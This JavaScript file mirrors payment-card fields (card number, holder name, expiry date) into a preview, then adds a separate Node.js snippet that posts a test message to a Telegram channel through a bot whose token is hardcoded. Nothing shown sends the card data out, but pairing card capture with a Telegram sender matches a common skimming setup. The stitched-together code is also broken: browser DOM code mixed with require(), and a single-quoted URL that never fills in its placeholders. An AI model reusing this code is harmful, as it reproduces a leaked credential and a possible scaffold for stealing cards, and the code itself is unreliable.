const inputField1 = document.getElementById('bankName');
const paymentSystem = document.getElementById('paymentSystem')
const cardNumber = document.getElementById('cardNumber')
const cardHolderName = document.getElementById('cardHolderName')
const expiryDate = document.getElementById('expiryDate')



const inputField2 = document.getElementById('MyNumber');
const paymentSystem1 = document.getElementById('paymentSystem1')
const cardNumber1 = document.getElementById('cardNumber1')
const cardHolderName1 = document.getElementById('cardHolderName1')
const expiryDate1 = document.getElementById('expiryDate1')




 
inputField1.addEventListener('input', function() {
  inputField2.textContent = inputField1.value
});


paymentSystem.addEventListener('input', function(){
  paymentSystem1.textContent = paymentSystem.value
});

cardNumber.addEventListener('input', function(){
  cardNumber1.textContent = cardNumber.value
})

cardHolderName.addEventListener('input', function(){
  cardHolderName1.textContent = cardHolderName.value
})

expiryDate.addEventListener('input', function(){
  expiryDate1.textContent = expiryDate.value
} )


const axios = require('axios');

const botToken = '7013897123:AAGh2qfg894OqNDnkG1Px6ErcjvXFPkYXxU';
const channelUsername = '@aswadiya'; // Имя вашего канала

// Функция для отправки сообщения на канал
async function sendMessageToChannel(message) {
  const url = 'https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${channelUsername}&text=${encodeURIComponent(message)}';
  
  try {
    const response = await axios.post(url);
    console.log(response.data);
  } catch (error) {
    console.error(error);
  }
}

// Пример отправки сообщения на канал
sendMessageToChannel('Привет, это сообщение отправлено на ваш канал!');

